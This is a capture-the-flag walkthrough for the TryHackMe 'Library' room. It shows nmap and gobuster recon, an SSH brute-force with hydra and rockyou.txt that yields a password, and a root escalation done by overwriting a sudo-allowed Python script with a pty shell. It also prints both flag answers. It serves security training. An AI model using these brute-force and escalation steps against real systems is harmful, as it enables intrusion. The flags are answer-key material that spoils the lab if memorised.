# Libray Walkthrough
### Link
- https://tryhackme.com/room/bseidesgtlibrary
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.54 seconds
```
```
sudo gobuster dir -u http://[IP]/ -w [Path]]/directory-list-2.3-small.txt
```
**Gobuster scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.222.1/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/16 18:52:50 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.222.1/images/]
```
The **gobuster** scan found the directory **/images**. After a quick check, nothing here.

I also checked the source page **http://[IP]**. I found a user information: **meliodas**
```
Posted on June 29th 2009 by meliodas - 3 comments
```

If you take more attention on the **nmap** scan result, we have an interesting information.
```
http-robots.txt: 1 disallowed entry
```
I checked this file: **http://[IP]/robots.txt
```
User-agent: rockyou 
Disallow: /
```
---
### Recon

We can try to brute force the SSH by using **hydra**. Based on the information in the **robots.txt**, we can try the wordlit **rockyou.txt**
```
sudo hydra -l meliodas -P [PATH]]/rockyou.txt [IP] ssh
```
Result:
```
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
[22][ssh] host: 10.10.222.1   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-16 19:10:44
```

Ok, Now we have the couple username:password --> meliodas:iloveyou1. Let's SSH the server^^

```
ssh meliodas@10.10.222.1
The authenticity of host '10.10.222.1 (10.10.222.1)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.222.1' (ED25519) to the list of known hosts.
meliodas@10.10.222.1's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$
```

**Question**
#### user.txt
```
meliodas@ubuntu:~$ ls -l
total 8
-rw-r--r-- 1 root     root     353 Aug 23  2019 bak.py
-rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

**Answer** 
#### 6d488cbb3f111d135722c33cb635f4ec
---
### Privilege Escalation

In addition to the **user.txt**, we have another file. A python script **bak.py**. Let's check this script.
```
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

Let's check the **meliodas** privileges
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

**meliodas** can execute this script without password requirement. So we can modify the script to perform a privilege escalation.
- First: Visit this [website](https://netsec.ws/?p=337) and select the python commandline
- Second: Take a copy of the bak.py. **Never modify the content file in Prod**
```
meliodas@ubuntu:~$ cp bak.py bak.py.cp
meliodas@ubuntu:~$ ls
bak.py  bak.py.cp  user.txt
```
- Third: Delete **bak.py**, create a new **bak.py** with the appropriate content ro execute the privilege escalation
```
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls -l
total 8
-rw-r--r-- 1 meliodas meliodas 353 Dec 16 16:26 bak.py.cp
-rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py
meliodas@ubuntu:~$ ls -l
total 12
-rw-rw-r-- 1 meliodas meliodas  33 Dec 16 16:31 bak.py
-rw-r--r-- 1 meliodas meliodas 353 Dec 16 16:26 bak.py.cp
-rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
```
- Fourth: Execute the python script
```
$ sudo python /home/meliodas/bak.py
# whoami
root
```
**Question**
#### root.txt
```
# cd /root
# ls
root.txt
# cat root.txt
e8c8c6c256c35515d1d344ee0488c617
```
**Answer** 
#### e8c8c6c256c35515d1d344ee0488c617
